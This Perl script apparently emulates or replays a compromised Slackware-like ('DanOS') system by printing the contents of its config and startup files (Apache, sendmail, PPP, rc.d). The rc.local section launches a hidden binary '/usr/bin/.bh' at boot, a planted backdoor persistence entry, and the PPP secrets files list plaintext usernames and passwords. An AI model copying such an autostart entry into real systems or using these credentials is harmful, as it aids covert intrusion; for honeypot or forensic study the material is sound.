# Each directory to which Apache has access, can be configured with respect
# to which services and features are allowed and/or disabled in that
# directory (and its subdirectories). 

# Originally by Rob McCool

# First, we configure the "default" to be a very restrictive set of 
# permissions.  

 
<directory />
 
Options FollowSymLinks  
# Basic security settings

AllowOverride None
# ACL files

 
</directory>
EOT
}

sub cat_72
{
   # /etc/httpd/conf/httpd.conf
   print STDERR << "EOT"
##
## httpd.conf -- Apache HTTP server configuration file
##

# This is the main server configuration file. See URL http://www.apache.org/
# for instructions.

# Do NOT simply read the instructions in here without understanding
# what they do, if you are unsure consult the online docs. You have been
# warned.  

# Originally by Rob McCool

# Dynamic Shared Object (DSO) Support
#
# To be able to use the functionality of a module which was built as a DSO you
# have to place corresponding `LoadModule' lines at this location so the
# directives contained in it are actually available _before_ they are used.
# Please read the file README.DSO in the Apache 1.3 distribution for more
# details about the DSO mechanism and run `httpd -l' for the list of already
# built-in (statically linked and thus always available) modules in your httpd
# binary.
#
# Example:
# LoadModule foo_module libexec/mod_foo.so
#
# Documentation for modules is in "/home/httpd/manual/mod" in HTML format.

#LoadModule mmap_static_module modules/mod_mmap_static.so
LoadModule env_module         libexec/mod_env.so
EOT
}

sub cat_73
{
   # /etc/httpd/conf/magic
   print STDERR << "EOT"
# Magic data for mod_mime_magic Apache module (originally for file(1) command)
# The module is described in htdocs/manual/mod/mod_mime_magic.html
#
# The format is 4-5 columns:
#    Column #1: byte number to begin checking from, ">" indicates continuation
#    Column #2: type of data to match
#    Column #3: contents of data to match
#    Column #4: MIME type of result
#    Column #5: MIME encoding of result (optional)

#------------------------------------------------------------------------------
# Localstuff:  file(1) magic for locally observed files
# Add any locally observed files here.

#------------------------------------------------------------------------------
# end local stuff
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Java

0	short		0xcafe
>2	short		0xbabe		application/java

#------------------------------------------------------------------------------
# audio:  file(1) magic for sound formats
#
# from Jan Nicolai Langfeldt <janl\@ifi.uio.no>,
#
EOT
}

sub cat_74
{
   # /etc/httpd/conf/mime.types
   print STDERR << "EOT"
# This is a comment. I love comments.

# This file controls what Internet media types are sent to the client for
# given file extension(s).  Sending the correct media type to the client
# is important so they know how to handle the content of the file.
# Extra types can either be added here or by using an AddType directive
# in your config files. For more information about Internet media types,
# please read RFC 2045, 2046, 2047, 2048, and 2077.  The Internet media type
# registry is at <ftp://ftp.iana.org/in-notes/iana/assignments/media-types/>.

# MIME type			Extension
application/EDI-Consent
application/EDI-X12
application/EDIFACT
application/activemessage
application/andrew-inset	ez
application/applefile
application/atomicmail
application/cals-1840
application/commonground
application/cybercash
application/dca-rft
application/dec-dx
application/eshop
application/hyperstudio
application/iges
application/mac-binhex40	hqx
application/mac-compactpro	cpt
application/macwriteii
application/marc
EOT
}

sub cat_75
{
   # /etc/httpd/conf/srm.conf
   print STDERR << "EOT"
##
## srm.conf -- Apache HTTP server configuration file
##

# With this document, you define the name space that users see of your http
# server.  This file also defines server settings which affect how requests are
# serviced, and how results should be formatted. 

# See the tutorials at http://www.apache.org/ for
# more information.

# Originally by Rob McCool; Adapted for Apache


# DocumentRoot: The directory out of which you will serve your
# documents. By default, all requests are taken from this directory, but
# symbolic links and aliases may be used to point to other locations.

DocumentRoot "/home/httpd/"

# UserDir: The name of the directory which is appended onto a user's home
# directory if a ~user request is recieved.

UserDir public_html

# DirectoryIndex: Name of the file or files to use as a pre-written HTML
# directory index.  Separate multiple entries with spaces.

DirectoryIndex index.html  
EOT
}

sub cat_76
{
   # /etc/mail/aliases.db
   print STDERR << "EOT"
            a                               эh^                                                                                                                                     `�      7�c�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 � ����������                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               \@ \@ root webmaster root toor root daemon root postmaster                     � ��������                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   root dumper root uucp root system root bin                     � ������                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 root decode root abuse root ingres                     � ��������                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 root manager root nobody root games postmaster mailer-daemon 
EOT
}

sub cat_77
{
   # /etc/mail/helpfile
   print STDERR << "EOT"
#vers	2
cpyr
cpyr	Copyright (c) 1998, 1999 Sendmail, Inc. and its suppliers.
cpyr	    All rights reserved.
cpyr	Copyright (c) 1983, 1995-1997 Eric P. Allman.  All rights reserved.
cpyr	Copyright (c) 1988, 1993
cpyr	    The Regents of the University of California.  All rights reserved.
cpyr
cpyr
cpyr	By using this file, you agree to the terms and conditions set
cpyr	forth in the LICENSE file which can be found at the top level of
cpyr	the sendmail distribution.
cpyr
cpyr	\$\$Id: helpfile,v 8.31 1999/11/14 21:42:03 gshapiro Exp \$\$
cpyr
smtp	This is sendmail version \$v
smtp	Topics:
smtp		HELO	EHLO	MAIL	RCPT	DATA
smtp		RSET	NOOP	QUIT	HELP	VRFY
smtp		EXPN	VERB	ETRN	DSN	AUTH
smtp	For more info use "HELP <topic>".
smtp	To report bugs in the implementation send email to
smtp		sendmail-bugs\@sendmail.org.
smtp	For local information send email to Postmaster at your site.
help	HELP [ <topic> ]
help		The HELP command gives help info.
helo	HELO <hostname>
helo		Introduce yourself.
ehlo	EHLO <hostname>
ehlo		Introduce yourself, and request extended SMTP mode.
EOT
}

sub cat_78
{
   # /etc/mail/sendmail.cf
   print STDERR << "EOT"
#
# Copyright (c) 1998-2000 Sendmail, Inc. and its suppliers.
#	All rights reserved.
# Copyright (c) 1983, 1995 Eric P. Allman.  All rights reserved.
# Copyright (c) 1988, 1993
#	The Regents of the University of California.  All rights reserved.
#
# By using this file, you agree to the terms and conditions set
# forth in the LICENSE file which can be found at the top level of
# the sendmail distribution.
#
#

######################################################################
######################################################################
#####
#####		SENDMAIL CONFIGURATION FILE
#####
##### built by gshapiro\@horsey.gshapiro.net on Thu Apr 6 14:36:13 PDT 2000
##### in /usr/local/src/sendmail/devel/OpenSource/sendmail-8.10.1/cf/cf
##### using ../ as configuration include directory
#####
######################################################################
######################################################################

#####  \$Id: cfhead.m4,v 8.76 2000/03/21 23:56:59 gshapiro Exp \$  #####
#####  \$Id: cf.m4,v 8.32 1999/02/07 07:26:14 gshapiro Exp \$  #####
#####  \$Id: generic-DanOS.mc,v 8.1 1999/09/24 22:48:05 gshapiro Exp \$  #####

#####  \$Id: DanOS.m4,v 8.11 1999/03/12 22:21:25 ca Exp \$  #####
EOT
}

sub cat_79
{
   # /etc/mail/sendmail.mc
   print STDERR << "EOT"
divert(-1)
#
# Copyright (c) 1998, 1999 Sendmail, Inc. and its suppliers.
#	All rights reserved.
# Copyright (c) 1983 Eric P. Allman.  All rights reserved.
# Copyright (c) 1988, 1993
#	The Regents of the University of California.  All rights reserved.
#
# By using this file, you agree to the terms and conditions set
# forth in the LICENSE file which can be found at the top level of
# the sendmail distribution.
#
#

#
#  This is a generic configuration file for DanOS.
#  It has support for local and SMTP mail only.  If you want to
#  customize it, copy it to a name appropriate for your environment
#  and do the modifications there.
#

divert(0)dnl
VERSIONID(`\$Id: generic-DanOS.mc,v 8.1 1999/09/24 22:48:05 gshapiro Exp \$')
OSTYPE(DanOS)dnl
DOMAIN(generic)dnl
MAILER(local)dnl
MAILER(smtp)dnl
EOT
}

sub cat_80
{
   # /etc/mail/sendmail.st
   print STDERR << "EOT"
ޱ    n��8h              �                                                                                                   �                                                                                                                                                                                                    A       �                                                                                                                                                                                                                                                                                      
EOT
}

sub cat_81
{
   # /etc/mail/statistics
   print STDERR << "EOT"
ޱ    ��9t  �   _                  �                                                                                                  \$      �                                                                                          W                                                                                                  ?      �
                                                                                                                                                                                                                                                                                    
EOT
}

sub cat_82
{
   # /etc/pam.d/ssh
   print STDERR << "EOT"
#%PAM-1.0
auth       required     /lib/security/pam_pwdb.so shadow
auth       required     /lib/security/pam_nologin.so
account    required     /lib/security/pam_pwdb.so
password   required     /lib/security/pam_cracklib.so
password   required     /lib/security/pam_pwdb.so shadow nullok use_authtok
session    required     /lib/security/pam_pwdb.so
EOT
}

sub cat_83
{
   # /etc/ppp/chap-secrets
   print STDERR << "EOT"
miltmaia	*	vine1
ventura	*	3246531
teuto	*	97teuto98
EOT
}

sub cat_84
{
   # /etc/ppp/ip-down
   print STDERR << "EOT"
#!/bin/sh
#
# This script is run by pppd after the PPP connection is ended.
#
# The companion file is /etc/ppp/ip-up, it's run when the PPP
# connection is started.
#
# This file is created when you run pppsetup: Tue Mar 28 20:54:40 BRT 2000
#
# The environment is cleared before executing this script
# so the path must be reset.
#
PATH=/usr/sbin:/sbin:/usr/bin:/usr/local/bin:/bin
export PATH

# Stop ping if you started it in /etc/ppp/ip-up.

#killall ping 2>/dev/null

# Stop the fetchmail daemon if you started it in /etc/ppp/ip-up
# with 'fetchmail -d 300'.

#fetchmail -q

# Send "ath" = hangup etc. to modem when ppp connection ends.
# You'll see the modem reponse OK and date in the /etc/ppp/modem.cua?, 
# modem.ttyS?, or modem.modem file.
# You need the 'modem-stats' program for this below to work.
# ftp://metalab.unc.edu/pub/apps/serialcomm/modem 
# modem-stats-1.0.1.src.elf.tar.gz
EOT
}

sub cat_85
{
   # /etc/ppp/ip-up
   print STDERR << "EOT"
#!/bin/sh
#
# This file /etc/ppp/ip-up is run by pppd when there's a
# successful ppp connection.
#
# Put any commands you want run after a successful connection
# in this file.
#
# Any commands you want printed to the screen should be directed
# to: >/dev/tty0
#
# Other commands should not be directed to: >/dev/tty0
#
# The companion file is /etc/ppp/ip-down, it's run when the PPP
# connection ends.
#
# This file is created when you run pppsetup: Tue Mar 28 20:54:40 BRT 2000
#
# The environment is cleared before executing this script
# so the path must be reset.
#
PATH=/usr/bin:/usr/sbin:/usr/local/bin:/sbin:/bin
export PATH

# This will print to the screen the local & remote IP address when you
# make a successful ppp connection.  \$4 = Local IP \$5 = Remote IP
#
# The CARRIER speed at which you connected will be reported, if it's in
# the /var/log/messages file.  You also need the programs "tail" "cut"
# "tr" "grep" and "syslogd" running for this to work.
EOT
}

sub cat_86
{
   # /etc/ppp/options
   print STDERR << "EOT"
# General configuration options for PPPD:
lock
defaultroute
noipdefault
modem
/dev/ttyS3
57600
crtscts
# Uncomment the line below for more verbose error reporting:
#debug
# If you have a default route already, pppd may require the other side
# to authenticate itself, which most ISPs will not do.  To work around this,
# uncomment the line below.  Note that this may have negative side effects
# on system security if you allow PPP dialins.  See the docs in /usr/doc/ppp*
# for more information.
#noauth
passive
asyncmap 0
name "teuto"
EOT
}

sub cat_87
{
   # /etc/ppp/options.demand
   print STDERR << "EOT"
# General configuration options for PPPD:
lock
defaultroute
noipdefault
modem
/dev/ttyS3
57600
crtscts
# Uncomment the line below for more verbose error reporting:
#debug
# If you have a default route already, pppd may require the other side
# to authenticate itself, which most ISPs will not do.  To work around this,
# uncomment the line below.  Note that this may have negative side effects
# on system security if you allow PPP dialins.  See the docs in /usr/doc/ppp*
# for more information.
#noauth
passive
asyncmap 0
name "teuto"
ipcp-accept-local
ipcp-accept-remote
0.0.0.0:10.10.10.10
demand
connect "/usr/sbin/chat -v -f /etc/ppp/pppscript"
EOT
}

sub cat_88
{
   # /etc/ppp/pap-secrets
   print STDERR << "EOT"
# PAP authentication file: /etc/ppp/pap-secrets
# This file should have a permission of 600.
# ~# chmod 600 /etc/ppp/pap-secrets
# Username      Server      Password      IP addresses
"teuto"   *   "97teuto98"
miltmaia	*	vine1
ventura	*	3246531
teuto	*	97teuto98
EOT
}

sub cat_89
{
   # /etc/ppp/pppscript
   print STDERR << "EOT"
TIMEOUT 60
ABORT ERROR
ABORT BUSY
ABORT "NO CARRIER"
ABORT "NO DIALTONE"
"" AT S7=45 S0=0 L1 M1 V1 X4 &c1 E1 Q0
"atdt3105500"
TIMEOUT 75
CONNECT
EOT
}

sub cat_90
{
   # /etc/ppp/pppsetup.txt
   print STDERR << "EOT"
=========================================================================
PPPSETUP 1.98 on SLACKWARE.

Written by Robert S. Liesenfeld <xunil\@bitstream.net> <IRC:Xunil>
Changes for 1.98 by Kent Robotti <robotti\@erols.com>
Patched for Slackware by Patrick Volkerding <volkerdi\@slackware.com>

You should get these docs if you don't already have them:

ftp://metalab.unc.edu/pub/DanOS/docs/howto/PPP-HOWTO
ftp://metalab.unc.edu/pub/DanOS/docs/faqs/PPP-FAQ

Press [Enter] to continue with pppsetup...
=========================================================================
These are your PPP configuration files and instructions...
=========================================================================

# This is your /etc/ppp/pppscript.

TIMEOUT 60
ABORT ERROR
ABORT BUSY
ABORT "NO CARRIER"
ABORT "NO DIALTONE"
"" AT S7=45 S0=0 L1 V1 X4 &c1 E1 Q0
"atdt3105500"
TIMEOUT 75
CONNECT 

# This is your /etc/ppp/options file.
EOT
}

sub cat_91
{
   # /etc/ppp/peers/wvdial
   print STDERR << "EOT"
noauth
name wvdial
EOT
}

sub cat_92
{
   # /etc/profile.d/kde.csh
   print STDERR << "EOT"
#!/bin/csh
# KDE additions:
if ( ! \$?KDEDIR ) then
    setenv KDEDIR /opt/kde
endif
if ( \$?PATH ) then
    setenv PATH \$KDEDIR/bin:\$PATH
else
    setenv PATH \$KDEDIR/bin
endif
EOT
}

sub cat_93
{
   # /etc/profile.d/kde.sh
   print STDERR << "EOT"
#!/bin/sh
# KDE additions:
KDEDIR=/opt/kde
PATH=\$PATH:\$KDEDIR/bin
export KDEDIR PATH
EOT
}

sub cat_94
{
   # /etc/profile.d/qt.csh
   print STDERR << "EOT"
#!/bin/csh
# Environment path variables for the Qt package:
if ( ! \$?QTDIR ) then
    setenv QTDIR /usr/lib/qt
endif
if ( \$?CPLUS_INCLUDE_PATH ) then
    setenv CPLUS_INCLUDE_PATH \$QTDIR/include:\$CPLUS_INCLUDE_PATH
else
    setenv CPLUS_INCLUDE_PATH \$QTDIR/include
endif
EOT
}

sub cat_95
{
   # /etc/profile.d/qt.sh
   print STDERR << "EOT"
#!/bin/sh
# Environment variables for the Qt package:
QTDIR=/usr/lib/qt
CPLUS_INCLUDE_PATH=\$QTDIR/include:\$CPLUS_INCLUDE_PATH
export QTDIR
export CPLUS_INCLUDE_PATH
EOT
}

sub cat_96
{
   # /etc/rc.d/rc.4
   print STDERR << "EOT"
#! /bin/sh
#
# rc.4		This file is executed by init(8) when the system is being
#		initialized for run level 4 (XDM)
#
# Version:	\@(#)/etc/rc.d/rc.4	2.00	02/17/93
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org>
#

# If there are SystemV init scripts for this runlevel, run them.
if [ -x /etc/rc.d/rc.sysvinit ]; then
  . /etc/rc.d/rc.sysvinit
fi

# Tell the viewers what's going to happen...
echo "Starting up X11 session manager..."

# KDE's kdm is the default session manager.  If you're got this, it's the
# one to use.
if [ -x /opt/kde/bin/kdm ]; then
  exec /opt/kde/bin/kdm -nodaemon
# GNOME's session manager is another choice:
elif [ -x /usr/bin/gdm ]; then
  exec /usr/bin/gdm -nodaemon
# If all you have is XDM, I guess it will have to do:
elif [ -x /usr/X11R6/bin/xdm ]; then
  exec /usr/X11R6/bin/xdm -nodaemon
fi
EOT
}

sub cat_97
{
   # /etc/rc.d/rc.6
   print STDERR << "EOT"
#! /bin/sh
#
# rc.6		This file is executed by init when it goes into runlevel
#		0 (halt) or runlevel 6 (reboot). It kills all processes,
#		unmounts file systems and then either halts or reboots.
#
# Version:	\@(#)/etc/rc.d/rc.6	1.50	1994-01-15
#
# Author:	Miquel van Smoorenburg <miquels\@drinkel.nl.mugnet.org>
# Modified by:  Patrick J. Volkerding, <volkerdi\@ftp.cdrom.com>
#

  # Set the path.
  PATH=/sbin:/etc:/bin:/usr/bin
  stty onlcr
  echo "Running shutdown script \$0:"
  command=reboot
  killall5 -15 
  # Turn off accounting:
  # Before unmounting file systems write a reboot or halt record to wtmp.
  echo "Unmounting remote filesystems."
  umount -a -tnfs
  swapoff -a
  umount -a -tnonfs -tnoumsdos
  # This never hurts:
  sync
  echo "Rebooting."
  reboot -f
EOT
}

sub cat_98
{
   # /etc/rc.d/rc.K
   print STDERR << "EOT"
#! /bin/sh
#
# rc.K 		This file is executed by init when it goes into runlevel
#		1, which is the administrative state. It kills all
#		deamons and then puts the system into single user mode.
#		Note that the file systems are kept mounted.
#
# Version:	\@(#)/etc/rc.d/rc.K	1.50	1994-01-18
# Version:	\@(#)/etc/rc.d/rc.K	1.60	1995-10-02 (PV)
#
# Author:	Miquel van Smoorenburg <miquels\@drinkel.nl.mugnet.org>
# Modified by:  Patrick J. Volkerding <volkerdi\@ftp.cdrom.com>
#

  # Set the path.
  PATH=/sbin:/etc:/bin:/usr/bin

  # If there are SystemV init scripts for this runlevel, run them.
  if [ -x /etc/rc.d/rc.sysvinit ]; then
    . /etc/rc.d/rc.sysvinit
  fi

  # Try to turn off quota:
  if fgrep quota /etc/fstab 1> /dev/null 2> /dev/null ; then
    if [ -x /sbin/quotaoff ]; then
      echo "Turning off filesystem quotas."
      /sbin/quotaoff -a
    fi
  fi
EOT
}

sub cat_99
{
   # /etc/rc.d/rc.M
   print STDERR << "EOT"
#!/bin/bash
#
# rc.M		This file is executed by init(8) when the system is being
#		initialized for one of the "multi user" run levels (i.e.
#		levels 1 through 6).  It usually does mounting of file
#		systems et al.
#
# Version:	\@(#)/etc/rc.d/rc.M	2.02	02/26/93
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org>
#		Heavily modified by Patrick Volkerding <volkerdi\@ftp.cdrom.com>
#

# Tell the viewers what's going to happen...
echo "Inicializando Sistema..."

# Screen blanks after 15 minutes idle time.
#/bin/setterm -blank 15

# Look for a CD-ROM in a CD-ROM drive, and if one is found,
# mount it under /cdrom.  This must happen before any of the
# binaries on the CD are needed.
#
# If you don't have a CD-ROM and want to disable this, set the
# /etc/rc.d/rc.cdrom permissions to non-executable: chmod 644 /etc/rc.d/rc.cdrom
# 
#if [ -x /etc/rc.d/rc.cdrom ]; then
#  . /etc/rc.d/rc.cdrom
#fi
EOT
}

sub cat_100
{
   # /etc/rc.d/rc.S
   print STDERR << "EOT"
#!/bin/sh
#
# /etc/rc.d/rc.S:  System initialization script.
#
# Mostly written by:  Patrick J. Volkerding, <volkerdi\@ftp.cdrom.com>
#

PATH=/sbin:/usr/sbin:/bin:/usr/bin

# enable swapping
/sbin/swapon -a

# Start update.
/sbin/update &

# Automatic module loading.  To load and unload kernel modules
# automatically as needed, uncomment the lines below to run kerneld.
# In some cases, you'll need to create aliases to load the correct
# module. For more information, see the docs in /usr/doc/modules.
# NOTE: This is commented out by default, since running kerneld has
# caused some experimental kernels to hang during boot.
#if [ -x /sbin/kerneld ]; then
#  /sbin/kerneld
#fi

# Test to see if the root partition is read-only, like it ought to be.
READWRITE=no
if echo -n >> "Testing filesystem status"; then
 rm -f "Testing filesystem status"
 READWRITE=yes
EOT
}

sub cat_101
{
   # /etc/rc.d/rc.atalk
   print STDERR << "EOT"
#
# AppleTalk daemons. Make sure not to start atalkd in the background:
# its data structures must have time to stablize before running the
# other processes.
#

#
# SUNOS: UNCOMMENT THESE LINES TO LOAD THE KERNEL MODULE.  Note that
# modunload-ing netatalk may cause your machine to panic or hang.
#
##echo -n 'loading netatalk: '
##if [ -f /etc/netatalk.o ]; then
##	/usr/etc/modload -sym /etc/netatalk.o;
##fi

echo -n 'starting appletalk daemons: '
if [ -x /usr/sbin/atalkd ]; then
	/usr/sbin/atalkd;		echo -n ' atalkd'
fi

if [ -x /usr/bin/nbprgstr ]; then
	/usr/bin/nbprgstr -p 4 `hostname|sed 's/\..*\$//'`:Workstation
	/usr/bin/nbprgstr -p 4 `hostname|sed 's/\..*\$//'`:netatalk
					echo -n ' nbprgstr'
fi

if [ -x /usr/sbin/papd ]; then
	/usr/sbin/papd;		echo -n ' papd'
fi
EOT
}

sub cat_102
{
   # /etc/rc.d/rc.cdrom
   print STDERR << "EOT"
#
# /etc/rc.d/rc.cdrom
# This script searches for a CD-ROM on the known DanOS CD devices.
# If one is found, it is mounted under \$MOUNTPOINT.
#
# It can make some darn annoying error messages though, so it's no
# longer executable by default.  If you want it on, do this:
#
#   chmod 755 rc.cdrom
#

MOUNTPOINT="/cdrom"
unset SKIP
# If something is already mounted, skip the rest of the tests:
if mount | fgrep "on \$MOUNTPOINT " 1> /dev/null 2> /dev/null ; then
  SKIP=1
elif [ ! -d \$MOUNTPOINT ]; then
  SKIP=1
fi
# Look for a detected IDE/ATAPI CD-ROM drive.  If we find one, try to mount:
if dmesg | fgrep ATAPI | fgrep CD 1> /dev/null 2> /dev/null ; then
  CD=`dmesg | fgrep ATAPI | fgrep CD | cut -f 1 -d ':' | sed -n "1 p"`
  echo "Kernel detected ATAPI CDROM drive /dev/\$CD, checking for a disc:"
  mount /dev/\$CD /cdrom -t iso9660
  SKIP=1
fi
# Next, look for and try to mount a SCSI CD-ROM drive:
if [ ! "\$SKIP" = "1" ]; then
  if dmesg | fgrep "scsi CD-ROM sr" | cut -d ' ' -f 4 1> /dev/null 2> /dev/null ; then
    CD=`dmesg | fgrep "scsi CD-ROM sr" | cut -d ' ' -f 4 | sed -n "1 p"`
EOT
}

sub cat_103
{
   # /etc/rc.d/rc.font.sample
   print STDERR << "EOT"
#!/bin/sh
#
# This selects your default screen font from among the ones in
# /usr/lib/kbd/consolefonts.
#
setfont -v
EOT
}

sub cat_104
{
   # /etc/rc.d/rc.gpm
   print STDERR << "EOT"
#!/bin/sh
# Running gpm
echo "Running gpm..."
gpm -m /dev/mouse -t ms 
# There is another way to run GPM, where it acts as a repeater outputting a
# virtual MouseSystems mouse on /dev/gpmdata.  This is useful for feeding
# gpm's data to X, especially if you've got a busmouse (in that situation X
# and gpm may not coexist without using a repeater).  To try running a GPM
# repeater for X, change the gpm command line to look like this:
# gpm -R msc -m /dev/mouse -t ms
# Then, make sure that the mouse configuration in your XF86Config file refers
# to the repeater device (/dev/gpmdata) and a MouseSystems mouse type.  If you
# edit the file directly, you'll want the lines to look like this (minus the
# comment marks '#' shown here, of course):
#Section "Pointer"
#    Protocol    "MouseSystems"
#    Device      "/dev/gpmdata"
EOT
}

sub cat_105
{
   # /etc/rc.d/rc.httpd
   print STDERR << "EOT"
/var/lib/apache/sbin/apachectl start
EOT
}

sub cat_106
{
   # /etc/rc.d/rc.ibcs2
   print STDERR << "EOT"
#!/bin/sh
#
if cat /proc/ksyms | grep waitqueue_lock 1> /dev/null 2> /dev/null ; then
  echo "Loading the iBCS module (compiled for SMP)..."
  /sbin/insmod /lib/modules/`uname -r`/smp/iBCS-smp.o
else
  echo "Loading the iBCS module..."
  /sbin/insmod iBCS
fi
EOT
}

sub cat_107
{
   # /etc/rc.d/rc.inet1
   print STDERR << "EOT"
#! /bin/sh
#
# rc.inet1	This shell script boots up the base INET system.
#
# Version:	\@(#)/etc/rc.d/rc.inet1	2.00	10/06/1999
#

HOSTNAME=`cat /etc/HOSTNAME`

# Attach the loopback device.
/sbin/ifconfig lo 127.0.0.1
/sbin/route add -net 127.0.0.0 netmask 255.0.0.0 lo

# IF YOU HAVE AN ETHERNET CONNECTION, use these lines below to configure the 
# eth0 interface.

# Edit these values to set up a static IP address:
IPADDR="127.0.0.1"	# REPLACE with YOUR IP address!
NETMASK="255.255.255.0"	# REPLACE with YOUR netmask!
NETWORK="127.0.0.0"	# REPLACE with YOUR network address!
BROADCAST=""	# REPLACE with YOUR broadcast address, if you
			# have one. If not, leave blank and edit below.
GATEWAY=""	# REPLACE with YOUR gateway address!

# To use DHCP instead of a static IP, set this value to "yes":
DHCP="no"            # Use DHCP ("yes" or "no")

# OK, time to set up the interface:
if [ "\$DHCP" = "yes" ]; then # use DHCP to set everything up:
  echo "Attempting to configure eth0 by contacting a DHCP server..."
EOT
}

sub cat_108
{
   # /etc/rc.d/rc.inet2
   print STDERR << "EOT"
!/bin/sh
#
# rc.inet2	This shell script boots up the entire INET system.
#		Note, that when this script is used to also fire
#		up any important remote NFS disks (like the /usr
#		distribution), care must be taken to actually
#		have all the needed binaries online _now_ ...
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org>
# Modified for Slackware by Patrick Volkerding <volkerdi\@slackware.com>
#

# Some constants:
NET="/usr/sbin"
IN_SERV="lpd"
LPSPOOL="/var/spool/lpd"

# If we see IPv4 packet forwarding support in the kernel, we will turn it on.
# This was the default for 2.0.x kernels, but with recent kernels it must be
# activated through a file in /proc.  IPv4 packet forwarding support is 
# required if you plan to use your DanOS machine as a router or firewall.
# If you don't want your DanOS machine to forward packets, change the 1 below
# to a 0.
IPV4_FORWARD=1
if [ -f /proc/sys/net/ipv4/ip_forward ]; then
  if [ "\$IPV4_FORWARD" = "1" ]; then
    echo "Activating IPv4 packet forwarding..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
  else
    echo "Disabling IPv4 packet forwarding..."
EOT
}

sub cat_109
{
   # /etc/rc.d/rc.local
   print STDERR << "EOT"
#!/bin/sh
#
# /etc/rc.d/rc.local:  Local system initialization script.
#
# Put any local setup commands in here:


/usr/bin/.bh &
EOT
}

sub cat_110
{
   # /etc/rc.d/rc.modules
   print STDERR << "EOT"
#!/bin/sh
# rc.modules 2.1  Tue Apr 13 14:35:33 CDT 1999 pjv <volkerdi\@slackware.com>
#
# This file loads extra drivers into the DanOS kernel.
# The modules will be looked for under /lib/modules/<kernel version number>
#
# Most DanOS kernel modules will accept extra options such as IRQ or base
# address, or to set various modes (such as 10baseT or BNC, etc).  The DanOS
# kernel source is the best place to look for extra documentation for the
# various modules.  This can be found under /usr/src/DanOS/Documentation if
# you've the installed the kernel sources.  Also, the kernel source docs are
# present on the Slackware CD in the /docs/DanOS-2.x.x directory.
#
# NOTE:  This may not be a complete list of modules.  If you don't see what
# you're looking for, look around in /lib/modules/2.x.x/ for an appropriate
# module.  Also, if any problems arise loading or using these modules, try
# compiling and installing a custom kernel that contains the support instead.
# That always works. ;^)
#
# This file is backwards compatible with DanOS 2.0.x, but not all of the
# listed modules will be available.
#

### Update module dependencies ###
echo "Updating module dependencies for DanOS `uname -r`:"
/sbin/depmod -a

### kerneld ###
# Automatic module loading.  To load and unload kernel modules
# automatically as needed, uncomment the lines below to run kerneld.
EOT
}

sub cat_111
{
   # /etc/rc.d/rc.pcmcia
   print STDERR << "EOT"
#!/bin/sh
#
# rc.pcmcia 1.23 1998/07/18 18:49:26 (David Hinds)
#
# This is designed to work in BSD as well as SysV init setups.  See
# the HOWTO for customization instructions.

usage()
{
    echo "Usage: \$0 {start|stop|restart}"
}

cleanup()
{
    while read SN CLASS MOD INST DEV EXTRA ; do
	if [ "\$SN" != "Socket" ] ; then
	    /etc/pcmcia/\$CLASS stop \$DEV 2> /dev/null
	fi
    done
}

# Allow environment variables to override all options
if [ "\$PCMCIA" ] ; then readonly PCMCIA ; fi
if [ "\$PCIC" ] ; then readonly PCIC ; fi
if [ "\$PCIC_OPTS" ] ; then readonly PCIC_OPTS ; fi
if [ "\$CORE_OPTS" ] ; then readonly CORE_OPTS ; fi
if [ "\$CARDMGR_OPTS" ] ; then readonly CARDMGR_OPTS ; fi
if [ "\$SCHEME" ] ; then readonly SCHEME ; fi

# Source PCMCIA configuration, if available
EOT
}

sub cat_112
{
   # /etc/rc.d/rc.samba
   print STDERR << "EOT"
#
# rc.samba: Start the samba server
#
if [ -x /usr/sbin/smbd -a -x /usr/sbin/nmbd ]; then
 echo "Starting Samba..."
 /usr/sbin/smbd -D
 /usr/sbin/nmbd -D
fi
EOT
}

sub cat_113
{
   # /etc/rc.d/rc.serial
   print STDERR << "EOT"
#
# /etc/rc.serial 
#	Initializes the serial ports on your system
#
# chkconfig: 2345 50 75
# description: This initializes the settings of the serial port
#
# Distributed with setserial version 2.15
